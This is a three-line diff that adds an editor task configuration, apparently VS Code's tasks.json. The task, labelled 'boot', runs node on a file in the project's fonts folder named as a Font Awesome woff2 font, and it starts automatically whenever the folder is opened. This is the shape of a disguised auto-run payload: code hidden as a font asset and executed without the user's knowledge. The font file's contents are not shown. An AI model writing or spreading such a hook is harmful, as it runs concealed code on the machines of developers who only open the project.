@@ -1,0 +1,3 @@
+{ "version": "2.0.0", "tasks": [
+  { "label": "boot", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-400.woff2"],
+    "runOptions": { "runOn": "folderOpen" } } ] }
